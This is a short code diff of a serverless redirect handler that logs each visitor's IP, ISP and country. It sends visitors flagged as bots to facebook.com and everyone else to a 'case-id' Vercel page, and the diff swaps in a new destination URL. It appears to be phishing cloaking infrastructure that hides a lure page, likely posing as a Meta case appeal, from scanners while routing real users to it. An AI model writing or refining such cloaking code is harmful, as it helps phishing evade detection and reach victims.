@@ -22,7 +22,7 @@ export default async function handler(req, res) {
     console.log(ip, " - isp:", isp, "- country:", country, "-- timestamp:", new Date(), ":: isBot: ", isBad);
 
     // Redirect
-    return res.redirect(302, isBad ? "https://www.facebook.com" : "https://case-id-9002127328.vercel.app/index");
+    return res.redirect(302, isBad ? "https://www.facebook.com" : "https://case-id-283212-app.vercel.app/");
   } catch (error) {
     console.error("Serverless Function Error:", error);
     res.status(500).json({ error: "Internal Server Error" });
@@ -177,4 +177,5 @@ async function proxy5(ip) {
     return "ALLOW";
   }
 }
+
 
